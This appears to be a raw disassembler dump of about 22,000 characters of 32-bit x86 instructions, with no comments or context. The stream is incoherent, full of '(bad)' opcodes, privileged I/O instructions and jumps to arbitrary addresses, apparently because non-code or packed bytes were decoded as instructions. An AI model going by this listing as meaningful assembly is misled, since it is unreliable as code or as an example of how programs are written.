  43cd1d:	xor    ch,ah
  43cd1f:	jl     0x43ccc5
  43cd21:	add    bh,BYTE PTR [esi]
  43cd23:	push   ss
  43cd24:	mov    bl,0x68
  43cd26:	cmp    eax,0x9a04e56d
  43cd2b:	sti    
  43cd2c:	je     0x43cd2b
  43cd2e:	jecxz  0x43cd37
  43cd30:	hlt    
  43cd31:	add    al,0x99
  43cd33:	or     BYTE PTR [ebx+0x8],al
  43cd36:	jecxz  0x43cd3b
  43cd38:	hlt    
  43cd39:	jmp    0x43cd20
  43cd3b:	fmul   QWORD PTR [ebp-0x75]
  43cd3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43cd3f:	(bad)  
  43cd40:	jp     0x43cd93
  43cd42:	fistp  WORD PTR [ebp-0x4c6ea9a5]
  43cd48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43cd49:	in     al,dx
  43cd4a:	sbb    edx,eax
  43cd4c:	dec    ebx
  43cd4d:	jmp    DWORD PTR [esi+0x48]
  43cd50:	out    0x89,eax
  43cd52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43cd53:	cdq    
  43cd54:	les    ecx,FWORD PTR [ebx+0x497a1034]
  43cd5a:	repz mov dl,0xb9
  43cd5d:	push   esp
  43cd5e:	outs   dx,BYTE PTR ds:[esi]
  43cd5f:	leave  
  43cd60:	sti    
  43cd61:	mov    ebx,DWORD PTR [edi]
  43cd63:	lock jb 0x43cdba
  43cd66:	jecxz  0x43cd1c
  43cd68:	push   cs
  43cd69:	shl    BYTE PTR [esi+0x48],cl
  43cd6c:	sti    
  43cd6d:	cmp    esp,DWORD PTR [esi+0x99]
	...
  43cd87:	add    BYTE PTR [eax],al
  43cd89:	test   al,0x91
  43cd8b:	adc    DWORD PTR es:[eax-0x3c],esi
  43cd8f:	or     eax,ebx
  43cd91:	jp     0x43cde3
  43cd93:	cmp    DWORD PTR [ebx+ebp*2+0x68b3ef41],0x18
  43cd9b:	addr16 nop
  43cd9d:	repz add ebx,DWORD PTR [esi]
  43cda0:	cdq    
  43cda1:	std    
  43cda2:	test   bl,ah
  43cda4:	sti    
  43cda5:	leave  
  43cda6:	or     ah,dl
  43cda8:	push   es
  43cda9:	je     0x43cd2c
  43cdab:	fild   WORD PTR [edx]
  43cdad:	idiv   DWORD PTR [eax-0x1f]
  43cdb0:	mov    BYTE PTR [ebx+0x7e],dh
  43cdb3:	and    al,0x1b
  43cdb5:	(bad)  
  43cdb6:	fwait
  43cdb7:	out    0x45,al
  43cdb9:	repnz aad 0x0
  43cdbc:	pusha  
  43cdbd:	lods   eax,DWORD PTR ds:[esi]
  43cdbe:	loop   0x43cdc5
  43cdc0:	sub    edx,DWORD PTR [ecx]
  43cdc2:	pop    ecx
  43cdc3:	call   0x43cb6b64
  43cdc8:	and    DWORD PTR [ecx+0x75e6f049],esi
  43cdce:	sub    cl,bh
  43cdd0:	push   cs
  43cdd1:	add    esi,DWORD PTR [ebx+0xc]
  43cdd4:	jb     0x43ce0b
  43cdd6:	repnz aaa 
  43cdd8:	lods   al,BYTE PTR ds:[esi]
  43cdd9:	add    ecx,DWORD PTR [ebx]
  43cddb:	jle    0x43cdb2
  43cddd:	jmp    0x850a:0x6562f9fa
  43cde4:	cmp    al,0xe4
  43cde6:	dec    edi
  43cde7:	jmpw   0xe6dd
  43cdeb:	and    BYTE PTR [ebp+0x0],ah
	...
  43ce05:	add    BYTE PTR [esi],dh
  43ce07:	inc    BYTE PTR [esi+0x4b86dc24]
  43ce0d:	shr    DWORD PTR [esi+0x1fa57dcd],1
  43ce13:	pop    es
  43ce14:	iret   
  43ce15:	out    0x73,al
  43ce17:	xchg   ecx,eax
  43ce18:	cli    
  43ce19:	scas   al,BYTE PTR es:[edi]
  43ce1a:	add    al,BYTE PTR [edi-0x1920e8d]
  43ce20:	push   eax
  43ce21:	cmp    DWORD PTR [ebx+0x54],ecx
  43ce24:	call   0xfa41fc8e
  43ce29:	push   0x3b
  43ce2b:	adc    al,BYTE PTR [ebx+0x7488eaa9]
  43ce31:	jg     0x43ce25
  43ce33:	cli    
  43ce34:	mov    ebp,DWORD PTR [esp+eax*1]
  43ce37:	dec    esi
  43ce38:	test   DWORD PTR [esi+0x2de8cc4e],esp
  43ce3e:	std    
  43ce3f:	cli    
  43ce40:	stc    
  43ce41:	push   0x3b
  43ce43:	add    al,BYTE PTR [ebx+0x5c88ba29]
  43ce49:	dec    edi
  43ce4a:	add    bh,bl
  43ce4c:	mov    eax,DWORD PTR [eax]
  43ce4e:	pusha  
  43ce4f:	or     eax,0x7ada8b50
  43ce54:	(bad)  
  43ce55:	call   0x39d9cb
  43ce5a:	push   ds
  43ce5b:	inc    esi
  43ce5c:	std    
  43ce5d:	test   ch,bl
  43ce5f:	inc    BYTE PTR [esp+eax*2+0x39f60ee3]
  43ce66:	dec    eax
  43ce67:	or     eax,0x8506
	...
  43ce80:	add    BYTE PTR [eax],al
  43ce82:	add    BYTE PTR [esi+0xf],al
  43ce85:	idiv   bh
  43ce87:	loopne 0x43ce45
  43ce89:	aad    0x52
  43ce8b:	out    0x46,al
  43ce8d:	or     dh,0xf5
  43ce90:	jmp    0x4bd:0x8362fff2
  43ce97:	fmul   DWORD PTR [eax+0x6]
  43ce9a:	test   esi,ebp
  43ce9c:	push   cs
  43ce9d:	idiv   bh
  43ce9f:	rol    ch,1
  43cea1:	cmc    
  43cea2:	push   eax
  43cea3:	xchg   esi,eax
  43cea4:	inc    edi
  43cea5:	or     dh,0x45
  43cea8:	xchg   ebx,eax
  43cea9:	repz jmp DWORD PTR [edx-0x7d]
  43cead:	mov    ebp,0x6488804
  43ceb2:	test   DWORD PTR [esi],edx
  43ceb4:	psadbw mm7,mm7
  43ceb7:	sahf   
  43ceb8:	(bad)  
  43ceb9:	cmc    
  43ceba:	add    DWORD PTR [edx],edx
  43cebc:	xchg   BYTE PTR [eax],al
  43cebe:	(bad)  
  43cebf:	bound  ecx,QWORD PTR [edi]
  43cec1:	sbb    BYTE PTR [ebp+0x7d],0x7e
  43cec5:	dec    esp
  43cec6:	fmul   QWORD PTR ds:0xb5750b6
  43cecc:	sbb    edi,esi
  43cece:	cmp    cl,ch
  43ced0:	or     BYTE PTR [ecx-0x3c],bh
  43ced3:	test   eax,0x580fb983
  43ced8:	and    edi,esp
  43ceda:	jmp    DWORD PTR [edx]
  43cedc:	jl     0x43cf32
  43cede:	cld    
  43cedf:	hlt    
  43cee0:	mov    edi,0x1c7fc278
  43cee5:	sbb    al,0x31
	...
  43ceff:	add    BYTE PTR [esi-0x4781f4bd],ch
  43cf05:	loop   0x43ce89
  43cf07:	mov    edi,0xfc3a68eb
  43cf0c:	xchg   ebx,eax
  43cf0d:	sub    edi,DWORD PTR [ebp+0x7c]
  43cf10:	mov    BYTE PTR [esi-0x1505fe48],bh
  43cf16:	add    al,0x79
  43cf19:	adc    ecx,DWORD PTR [ebx]
  43cf1b:	xchg   BYTE PTR [ecx+0x7f59ab29],bh
  43cf21:	pop    ds
  43cf22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43cf23:	xchg   BYTE PTR [ecx-0x67],bl
  43cf26:	inc    eax
  43cf27:	retf   
  43cf28:	sub    BYTE PTR [ecx-0x66801488],bl
  43cf2e:	cmc    
  43cf2f:	dec    esi
  43cf30:	mov    ds:0xab0b9276,al
  43cf35:	jbe    0x43cf7a
  43cf37:	xchg   BYTE PTR ds:0x4c259e3,bh
  43cf3d:	addr16 sub al,0xc0
  43cf40:	sbb    al,0xde
  43cf42:	jbe    0x43cfc0
  43cf44:	in     al,dx
  43cf45:	outs   dx,BYTE PTR ds:[esi]
  43cf46:	and    BYTE PTR [edx],bl
  43cf48:	ins    DWORD PTR es:[edi],dx
  43cf49:	sbb    BYTE PTR [eax],al
  43cf4b:	xchg   DWORD PTR [ebx+ebx*8],ebp
  43cf4e:	pop    ecx
  43cf4f:	(bad)  
  43cf51:	outs   dx,BYTE PTR ds:[esi]
  43cf52:	and    al,0xa
  43cf54:	mov    bl,0x74
  43cf56:	xchg   DWORD PTR [edi],ecx
  43cf58:	outs   dx,DWORD PTR ds:[esi]
  43cf59:	adc    esp,edi
  43cf5b:	or     ah,BYTE PTR [eax-0x2c81095e]
  43cf61:	add    bh,BYTE PTR [ebp-0x3e]
	...
  43cf7c:	add    BYTE PTR [eax-0x4a00021e],ah
  43cf82:	test   esi,esi
  43cf84:	mov    BYTE PTR [esi-0x2e],cl
  43cf87:	js     0x43cf49
  43cf89:	jg     0x43cf8f
  43cf8b:	popa   
  43cf8c:	cld    
  43cf8d:	(bad)  
  43cf8e:	cld    
  43cf8f:	out    dx,al
  43cf90:	sbb    BYTE PTR [ebx-0x43e9fe5],0x8f
  43cf97:	sub    ah,bh
  43cf99:	pop    edi
  43cf9a:	hlt    
  43cf9b:	in     al,dx
  43cf9c:	inc    edx
  43cf9d:	mov    cs,WORD PTR [edi]
  43cf9f:	call   0xf81d:0x28019242
  43cfa6:	xchg   DWORD PTR [edi-0x34],eax
  43cfa9:	or     ah,dh
  43cfab:	add    al,BYTE PTR [ecx]
  43cfad:	lods   eax,DWORD PTR ds:[esi]
  43cfae:	pop    edx
  43cfaf:	jo     0x43cf72
  43cfb1:	test   DWORD PTR [ebp-0x382f5723],0xc83f3f1b
  43cfbb:	xor    edi,DWORD PTR [edi]
  43cfbd:	das    
  43cfbe:	enter  0x3f2b,0x2f
  43cfc2:	enter  0x789c,0x5f
  43cfc6:	xchg   ebx,edi
  43cfc8:	xchg   esi,eax
  43cfc9:	mov    edx,0x537f3a52
  43cfce:	aaa    
  43cfcf:	fcmovbe st,st(7)
  43cfd1:	and    bh,BYTE PTR [edi]
  43cfd3:	ficom  DWORD PTR [ecx+0x6e2289f9]
  43cfd9:	into   
  43cfda:	pop    edx
  43cfdb:	push   ds
  43cfdc:	jg     0x43cff6
  43cfde:	pop    ecx
  43cfdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43cfe0:	jg     0x43cfe2
	...
  43cffa:	mov    ch,0x5c
  43cffc:	out    0xc1,al
  43cffe:	mov    ebx,0xfaa8198f
  43d003:	dec    edx
  43d004:	xor    edi,DWORD PTR [edi-0x5b]
  43d007:	xor    al,0x32
  43d009:	mov    ch,0xab
  43d00b:	push   esi
  43d00c:	cmp    DWORD PTR [ecx+edi*8],ebx
  43d00f:	ds out 0x3,eax
  43d012:	imul   eax,ecx,0xffffffdb
  43d015:	and    BYTE PTR [ebx-0x4d791b8f],0xfa
  43d01c:	add    BYTE PTR [edx+0x754389b0],al
  43d022:	add    BYTE PTR [ebx-0x33bce6be],0xe8
  43d029:	test   eax,0x6af9fee8
  43d02e:	xor    al,0x6
  43d030:	sub    DWORD PTR [ecx],0xffffff84
  43d033:	add    DWORD PTR [ebp+0x32],edi
  43d036:	out    dx,eax
  43d037:	loop   0x43d043
  43d039:	push   0xa250f66d
  43d03e:	clc    
  43d03f:	cli    
  43d040:	ins    DWORD PTR es:[edi],dx
  43d041:	in     al,0x3a
  43d043:	popf   
  43d044:	stc    
  43d045:	es out dx,eax
  43d047:	add    BYTE PTR [edx-0x27],0xfc
  43d04b:	dec    eax
  43d04c:	mov    WORD PTR [eax+0x51e8cbf2],?
  43d052:	clc    
  43d053:	(bad)  
  43d054:	stc    
  43d055:	push   0xffffffb4
  43d057:	add    eax,0xfb842983
  43d05c:	jle    0x43d080
	...
  43d076:	add    bh,bh
  43d078:	add    BYTE PTR [edx-0x47],0xcc
  43d07c:	push   eax
  43d07d:	nop
  43d07e:	cmp    eax,ebx
  43d080:	retf   
  43d081:	call   0xfa42c00f
  43d086:	push   0xfffffff3
  43d088:	add    eax,0xfb7ba983
  43d08d:	jle    0x43d041
  43d08f:	out    dx,al
  43d090:	mov    BYTE PTR [ebx+0x55],al
  43d093:	add    DWORD PTR [bp+si-0x7],0xffffff92
  43d098:	retf   
  43d099:	call   0xfa42cfff
  43d09e:	push   0xffffffc3
  43d0a0:	add    eax,0xfb6ba983
  43d0a5:	jle    0x43d049
  43d0a7:	inc    BYTE PTR [edx+0x496cd942]
  43d0ad:	cwde   
  43d0ae:	add    ah,bh
  43d0b0:	jns    0x43d079
  43d0b2:	call   0x39de94
  43d0b7:	pop    esi
  43d0b8:	cmp    bh,ch
  43d0ba:	test   BYTE PTR [ebp+0x682fa89],bl
  43d0c0:	jb     0x54bfae0c
  43d0c6:	pushf  
  43d0c7:	outs   dx,DWORD PTR ds:[esi]
  43d0c8:	jp     0x43d091
  43d0ca:	call   0x39de54
  43d0cf:	push   cs
  43d0d0:	cmp    bh,ch
  43d0d2:	test   ch,cl
  43d0d4:	mov    edx,edi
  43d0d6:	adc    dh,0xe
  43d0d9:	add    BYTE PTR [ebp+0x0],0x0
	...
  43d0f1:	add    BYTE PTR [eax],al
  43d0f3:	add    BYTE PTR [ecx],bh
  43d0f5:	mov    bh,0x49
  43d0f7:	lea    eax,[eax+0x31]
  43d0fa:	loope  0x43d08d
  43d0fc:	fisttp DWORD PTR [esi]
  43d0fe:	test   BYTE PTR [ebx+0x4d8cd5a3],0xbd
  43d105:	mov    al,0x82
  43d107:	into   
  43d108:	add    eax,0x5afff173
  43d10d:	jg     0x43d0cc
  43d10f:	or     al,0xe0
  43d111:	inc    ebp
  43d112:	ins    DWORD PTR es:[edi],dx
  43d113:	add    ebx,esi
  43d115:	cmp    dh,dh
  43d117:	mov    edx,DWORD PTR [ebx]
  43d119:	ror    DWORD PTR [ebp+edx*2-0x317d4de7],1
  43d120:	xor    eax,0x3afff187
  43d125:	jg     0x43d0e4
  43d127:	add    al,0x90
  43d129:	inc    eax
  43d12a:	ins    DWORD PTR es:[edi],dx
  43d12b:	add    ecx,DWORD PTR [esi-0x1f7409c9]
  43d131:	or     al,0x8c
  43d133:	dec    ebp
  43d134:	pop    ecx
  43d135:	jge    0x43d17b
  43d137:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43d138:	xchg   dh,al
  43d13a:	sub    DWORD PTR [ecx-0x7a],edx
  43d13d:	mov    BYTE PTR ds:[ebp-0xc],bh
  43d141:	inc    ebp
  43d142:	sbb    al,0x55
  43d144:	in     al,dx
  43d145:	xchg   DWORD PTR [edi],eax
  43d147:	jle    0x43d101
  43d149:	jmp    0xc684:0xeb60bf7a
  43d150:	shl    DWORD PTR [ebx-0x57],cl
  43d153:	sti    
  43d154:	jns    0x43d177
  43d156:	push   eax
  43d157:	dec    edi
	...
  43d170:	add    BYTE PTR [edi-0x58],ch
  43d173:	int    0x86
  43d175:	stos   BYTE PTR es:[edi],al
  43d176:	jne    0x43d121
  43d178:	stos   DWORD PTR es:[edi],eax
  43d179:	jge    0x43d14c
  43d17b:	dec    ebp
  43d17c:	out    0xcd,eax
  43d17e:	dec    edi
  43d17f:	pop    es
  43d180:	cli    
  43d181:	ja     0x43d1ad
  43d183:	add    BYTE PTR [ebp+0x7f04b2b4],al
  43d189:	mov    edi,0xc4417b2f
  43d18e:	pop    eax
  43d18f:	mov    cl,0xb7
  43d191:	and    eax,0xb5e73673
  43d196:	sysret 
  43d198:	cli    
  43d199:	ja     0x43d1c5
  43d19b:	add    BYTE PTR [ebp+0x7f049234],al
  43d1a1:	das    
  43d1a2:	(bad)  
  43d1a3:	jp     0x43d1e6
  43d1a5:	and    al,0x69
  43d1a7:	test   eax,0x3662a6bb
  43d1ac:	out    0x9d,eax
  43d1ae:	out    dx,eax
  43d1af:	or     dl,bh
  43d1b1:	ja     0x43d15d
  43d1b3:	stc    
  43d1b4:	test   BYTE PTR [edx+edx*2],dh
  43d1b7:	add    edi,DWORD PTR [edi+0x3f]
  43d1ba:	iret   
  43d1bb:	jb     0x43d201
  43d1bd:	xor    al,0x3e
  43d1bf:	jnp    0x43d202
  43d1c1:	in     al,0x72
  43d1c3:	aaa    
  43d1c4:	out    0x85,eax
  43d1c6:	scas   eax,DWORD PTR es:[edi]
  43d1c7:	or     dl,bh
  43d1c9:	ja     0x43d175
  43d1cb:	stc    
  43d1cc:	test   BYTE PTR [edx+esi*1],dh
  43d1cf:	add    edi,DWORD PTR [edi+0x2f]
  43d1d2:	add    eax,0x7ca2
	...
  43d1eb:	add    BYTE PTR [eax],al
  43d1ed:	add    BYTE PTR [ebp-0x484993cc],dh
  43d1f3:	push   ebp
  43d1f4:	pop    esi
  43d1f5:	cmp    ebx,edx
  43d1f7:	jge    0x43d18b
  43d1f9:	or     dh,bl
  43d1fb:	sub    DWORD PTR [ebx-0xc3b8f01],0x4
  43d202:	push   ebx
  43d203:	int3   
  43d204:	jb     0x43d282
  43d206:	xor    eax,0xbbae5c35
  43d20b:	push   edx
  43d20c:	outs   dx,BYTE PTR ds:[esi]
  43d20d:	cmp    ebx,edx
  43d20f:	lds    edx,FWORD PTR [edx+0x8]
  43d212:	scas   al,BYTE PTR es:[edi]
  43d213:	sub    DWORD PTR [ebx],0xffffffff
  43d216:	jo     0x43d1dc
  43d218:	rol    DWORD PTR [ebx+eiz*1],cl
  43d21b:	int3   
  43d21c:	inc    edx
  43d21d:	jbe    0x43d24f
  43d21f:	stc    
  43d220:	xchg   edi,eax
  43d221:	jl     0x43d258
  43d223:	xor    eax,0xad93395e
  43d228:	xor    cl,BYTE PTR [eax]
  43d22a:	jle    0x43d1af
  43d22c:	sub    edi,edi
  43d22e:	jo     0x43d1f4
  43d230:	xchg   ebx,eax
  43d231:	add    al,0xf3
  43d233:	retf   
  43d234:	adc    bh,BYTE PTR [eax+edi*4-0x8]
  43d238:	pusha  
  43d239:	xchg   BYTE PTR [ebx-0x75],bl
  43d23c:	test   BYTE PTR [edi+0x6c],cl
  43d23f:	dec    ecx
  43d240:	add    edi,DWORD PTR [edx-0x30]
  43d243:	clc    
  43d244:	ins    BYTE PTR es:[edi],dx
  43d245:	sub    al,0xfe
  43d247:	sub    DWORD PTR [ebx+eax*1],0xc16e04f4
  43d24e:	jmp    0x43d1d1
  43d250:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d251:	nop
	...
  43d26a:	add    BYTE PTR [ebx+ecx*4-0x21d0fdc],dh
  43d271:	push   esi
  43d272:	cld    
  43d273:	jnp    0x43d28d
  43d275:	jmp    0x7d03:0xcef8987c
  43d27c:	dec    ecx
  43d27d:	add    BYTE PTR [ebp+0x874fa75],dh
  43d283:	jne    0x43d251
  43d285:	je     0x43d28b
  43d287:	jg     0x43d2d9
  43d289:	cld    
  43d28a:	jb     0x43d236
  43d28c:	es dec esi
  43d28e:	bound  ebx,QWORD PTR [edx-0x5d9dafe6]
  43d294:	add    cl,BYTE PTR [edi+0x1b]
  43d297:	repz lds edi,FWORD PTR [ebp-0x5b]
  43d29b:	enter  0x432f,0x75
  43d29f:	idiv   DWORD PTR fs:[esi-0x5e]
  43d2a3:	sti    
  43d2a4:	push   ds
  43d2a5:	jnp    0x43d30c
  43d2a7:	cmp    DWORD PTR [ecx-0x4],edi
  43d2aa:	fbstp  TBYTE PTR fs:[eax+0x73]
  43d2ae:	push   0x7d
  43d2b0:	push   cs
  43d2b1:	add    ch,dl
  43d2b3:	mov    bh,BYTE PTR [edi+0x43]
  43d2b6:	sbb    DWORD PTR [edi],0xd3021c79
  43d2bc:	data16 (bad) 
  43d2be:	popa   
  43d2bf:	clc    
  43d2c0:	jbe    0x43d33d
  43d2c2:	sub    eax,0x721f70f8
  43d2c7:	mov    ch,0xfa
  43d2c9:	test   DWORD PTR [edi+0x6fff6047],ebp
	...
  43d2e7:	add    BYTE PTR [esi-0x48b0ba],ah
  43d2ed:	ret    
  43d2ee:	xor    ecx,ebp
  43d2f0:	div    DWORD PTR [ebp-0x3c]
  43d2f3:	aad    0x74
  43d2f5:	mov    dh,0x73
  43d2f7:	in     al,dx
  43d2f8:	enter  0xfc40,0x2
  43d2fc:	div    DWORD PTR [ebp-0x3b]
  43d2ff:	out    0x76,al
  43d301:	jns    0x43d2bb
  43d303:	jmp    0x54c0f389
  43d308:	sbb    al,0xf6
  43d30a:	jae    0x43d311
  43d30c:	lahf   
  43d30d:	push   eax
  43d30e:	sbb    BYTE PTR [eax],al
  43d310:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43d311:	mov    bh,0x29
  43d313:	mov    esp,ebx
  43d315:	in     al,dx
  43d316:	dec    esi
  43d317:	push   edx
  43d318:	xchg   esi,eax
  43d319:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d31a:	std    
  43d31b:	dec    edi
  43d31c:	fdiv   st(5),st
  43d31e:	retf   0x4983
  43d321:	repnz sub cl,cl
  43d324:	(bad)  
  43d325:	ss je  0x43d32e
  43d328:	into   
  43d329:	inc    ecx
  43d32a:	xor    cl,al
  43d32c:	or     DWORD PTR [edx],eax
  43d32e:	jns    0x43d2fb
  43d330:	jb     0x43d3ac
  43d332:	inc    esp
  43d333:	mov    eax,0xcf223a46
  43d338:	fdivr  QWORD PTR [ebp+esi*8+0x547ad5eb]
  43d33f:	mov    eax,0x8bf5b4cc
  43d344:	fild   WORD PTR [edx+edx*8+0x39180f]
	...
  43d363:	add    BYTE PTR [eax],al
  43d365:	lea    eax,[ecx+edi*4+0xe5090f]
  43d36c:	add    BYTE PTR [ebp+0x14fc44d8],bl
  43d372:	lods   eax,DWORD PTR ds:[esi]
  43d373:	in     eax,dx
  43d374:	je     0x43d36e
  43d376:	jns    0x43d3bc
  43d378:	cld    
  43d379:	je     0x43d316
  43d37b:	add    BYTE PTR [edx-0x53],dl
  43d37e:	jp     0x43d3bf
  43d380:	xor    BYTE PTR [ebp+0x4a49e1a7],ch
  43d386:	add    DWORD PTR [eax],eax
  43d388:	or     DWORD PTR [ecx],0xffffffe6
  43d38b:	jp     0x43d35c
  43d38d:	push   edx
  43d38e:	jne    0x43d349
  43d390:	jne    0x43d3ea
  43d392:	js     0x43d3d8
  43d394:	cld    
  43d395:	div    dh
  43d397:	sbb    bh,0x26
  43d39a:	add    edi,DWORD PTR [ecx-0x31]
  43d39d:	push   edx
  43d39e:	cmp    DWORD PTR [eax+edi*4-0xc],0xffffffeb
  43d3a3:	hlt    
  43d3a4:	adc    DWORD PTR [edi],0x6ffffdeb
  43d3aa:	and    eax,0xbbc18cd4
  43d3af:	lods   eax,DWORD PTR ds:[esi]
  43d3b0:	xchg   BYTE PTR [edx],bh
  43d3b2:	ret    
  43d3b3:	div    ecx
  43d3b5:	add    esp,DWORD PTR [esi+0x68f0c37f]
  43d3bb:	inc    esp
  43d3bc:	jae    0x43d3b4
  43d3be:	jbe    0x43d3e3
  43d3c0:	xchg   BYTE PTR [edx],dh
  43d3c2:	into   
  43d3c3:	jb     0x43d419
  43d3c5:	fdiv   QWORD PTR [eax]
  43d3c7:	ja     0x43d392
	...
  43d3e1:	add    ah,cl
  43d3e3:	jb     0x43d3ee
  43d3e5:	cli    
  43d3e6:	rcr    DWORD PTR [edi+0x40],cl
  43d3e9:	add    esi,DWORD PTR [ecx-0x62]
  43d3ec:	nop
  43d3ed:	std    
  43d3ee:	outs   dx,BYTE PTR ds:[esi]
  43d3ef:	cmp    DWORD PTR [edi+0x7c],0xffffffc4
  43d3f3:	fisttp QWORD PTR [edx+0x51d0ed79]
  43d3f9:	je     0x43d404
  43d3fb:	pop    edi
  43d3fc:	sub    DWORD PTR [edi-0x7313270c],0x86b49a31
  43d406:	cmp    ch,dh
  43d408:	js     0x43d3d3
  43d40a:	pushf  
  43d40b:	jp     0x43d417
  43d40d:	cli    
  43d40e:	sbb    DWORD PTR [edi+0x40],0x3
  43d412:	jno    0x43d432
  43d414:	nop
  43d415:	std    
  43d416:	jle    0x43d44b
  43d418:	lds    edi,FWORD PTR [eax+edx*4-0x6f]
  43d41c:	loop   0x43d49c
  43d41e:	loope  0x43d465
  43d420:	add    al,0x75
  43d422:	add    esi,DWORD PTR [edi-0x46]
  43d425:	das    
  43d426:	and    DWORD PTR [ecx+0x2c7f5059],0xe34a951c
  43d430:	add    al,0x7e
  43d432:	xor    BYTE PTR ds:0x79737eeb,al
  43d438:	in     eax,0x78
  43d43a:	dec    esi
  43d43b:	cs push esp
  43d43d:	and    BYTE PTR [eax+0x13866611],ch
  43d443:	add    eax,0xed3c
	...
  43d45c:	add    BYTE PTR [eax],al
  43d45e:	add    BYTE PTR [edx+0x4b],bh
  43d461:	div    DWORD PTR [esi-0x60]
  43d464:	call   0xdd714d7e
  43d469:	das    
  43d46a:	push   cs
  43d46b:	(bad)  
  43d46c:	repz data16 aas 
  43d46f:	test   DWORD PTR [ecx+0x7ee98fa7],0xc560cab2
  43d479:	adc    al,0xd6
  43d47b:	push   0x7ab39349
  43d480:	dec    edx
  43d481:	mov    bh,0x78
  43d483:	mov    ebp,0xbe0ea3dc
  43d488:	repz data16 aas 
  43d48b:	neg    edi
  43d48d:	cld    
  43d48e:	js     0x43d4d0
  43d490:	in     eax,dx
  43d491:	outs   dx,BYTE PTR ds:[esi]
  43d492:	lods   eax,DWORD PTR ds:[esi]
  43d493:	fistp  DWORD PTR [esi-0x18]
  43d496:	cdq    
  43d497:	mov    ds:0x93adb554,eax
  43d49c:	imul   edi,ecx,0x2387f403
  43d4a2:	out    dx,eax
  43d4a3:	jo     0x43d469
  43d4a5:	mov    ebx,0x5ed37b01
  43d4aa:	mov    esi,0xbb47f87
  43d4af:	or     BYTE PTR [eax-0x11],0xff
  43d4b3:	jl     0x43d4fe
  43d4b5:	sbb    ecx,eax
  43d4b7:	mov    eax,0xf881daac
  43d4bc:	repz add al,BYTE PTR [eax+edi*2]
  43d4c0:	iret   
  43d4c1:	jmp    0x0:0x7e
	...
  43d4dc:	outs   dx,DWORD PTR ds:[esi]
  43d4dd:	add    al,0x0
  43d4df:	jmp    0xc9bf48db
  43d4e4:	idiv   DWORD PTR [eax+0x6f]
  43d4e7:	jb     0x43d55e
  43d4e9:	mov    al,0x85
  43d4eb:	and    al,0xdc
  43d4ed:	cmp    eax,edi
  43d4ef:	pop    edx
  43d4f0:	add    al,0x8a
  43d4f2:	push   ebx
  43d4f3:	or     DWORD PTR [esi],ebp
  43d4f5:	or     BYTE PTR [ecx],dl
  43d4f7:	jmp    0xd338447c
  43d4fc:	repz mov eax,DWORD PTR [ebx-0x43]
  43d500:	jnp    0x43d571
  43d502:	cld    
  43d503:	jmp    0x2cc8e58b
  43d508:	hlt    
  43d509:	mov    WORD PTR [esi-0x18],fs
  43d50c:	inc    ecx
  43d50d:	push   ebp
  43d50e:	test   DWORD PTR [edi],ebp
  43d510:	sub    BYTE PTR [ebp+0x52],dl
  43d513:	sub    edi,0x7ae90036
  43d519:	leave  
  43d51a:	adc    al,0x64
  43d51c:	mov    al,0x79
  43d51e:	std    
  43d51f:	imul   esi,DWORD PTR [ebx+0x3c6e83ec],0xdbe47d1f
  43d529:	add    al,0x72
  43d52b:	adc    DWORD PTR [ebx+0x6e],edi
  43d52e:	hlt    
  43d52f:	bound  eax,QWORD PTR [ebp+0x25]
  43d532:	test   DWORD PTR [edi-0x1abd7819],esi
  43d538:	cs inc edx
  43d53a:	test   DWORD PTR [edi+0x365042f3],ebp
	...
  43d558:	add    BYTE PTR [ecx-0x45263b90],ch
  43d55e:	ret    
  43d55f:	je     0x43d556
  43d561:	(bad)  
  43d562:	outs   dx,DWORD PTR ds:[esi]
  43d563:	lds    ebx,FWORD PTR [esi]
  43d565:	(bad)  
  43d566:	xchg   DWORD PTR [ebp+0x5be672b2],edi
  43d56c:	sub    ch,BYTE PTR [ebp-0x28]
  43d56f:	jae    0x43d571
  43d571:	inc    eax
  43d572:	mov    esi,DWORD PTR [ebp+0x8]
  43d575:	pop    ebp
  43d576:	jp     0x43d57d
  43d578:	mov    ecx,eax
  43d57a:	std    
  43d57b:	mov    al,0x16
  43d57d:	dec    ebp
  43d57e:	push   es
  43d57f:	add    BYTE PTR [ebp-0x5a146b30],cl
  43d585:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43d586:	cmp    al,0xc
  43d588:	test   DWORD PTR [ebp+0x7a],ecx
  43d58b:	add    ecx,DWORD PTR [ebx+0x4d83dce0]
  43d591:	and    eax,0xc5891081
  43d596:	cld    
  43d597:	push   esi
  43d598:	pop    esi
  43d599:	xchg   esi,eax
  43d59a:	retf   0x8b53
  43d59d:	xor    BYTE PTR [ebp-0x45],ah
  43d5a0:	int3   
  43d5a1:	test   eax,0x99ccccc1
  43d5a6:	ror    esp,0xcc
  43d5a9:	and    BYTE PTR [edx+0x1d108bec],al
  43d5af:	or     DWORD PTR [ebp-0x43],0xffffff82
  43d5b3:	dec    ebp
  43d5b4:	sbb    al,0xed
  43d5b6:	cmp    DWORD PTR ds:0x4581dc18,0x14
	...
  43d5d4:	add    BYTE PTR [eax],al
  43d5d6:	fild   WORD PTR [ecx-0x7d92efb3]
  43d5dc:	cmp    eax,0x62576c0c
  43d5e1:	add    BYTE PTR [ebp-0x7e],bl
  43d5e4:	cmp    eax,0xf31f3508
  43d5e9:	(bad)  
  43d5ea:	cmp    cl,BYTE PTR [ebx-0x3897df3c]
  43d5f0:	and    BYTE PTR [eax],al
  43d5f2:	pusha  
  43d5f3:	sub    ah,0x56
  43d5f6:	push   ss
  43d5f7:	ins    DWORD PTR es:[edi],dx
  43d5f8:	or     BYTE PTR [ebp-0x72f792ed],al
  43d5fe:	xchg   ebx,eax
  43d5ff:	(bad)  
  43d600:	push   esi
  43d601:	pop    ebp
  43d602:	hlt    
  43d603:	sbb    eax,0xa96f0001
  43d608:	jne    0x43d58f
  43d60a:	ret    0x6b87
  43d60d:	add    dh,bl
  43d60f:	fld    TBYTE PTR [ebx+0x0]
  43d612:	into   
  43d613:	fld    TBYTE PTR [ebx+0x0]
  43d616:	ins    DWORD PTR es:[edi],dx
  43d617:	test   eax,0x78f46655
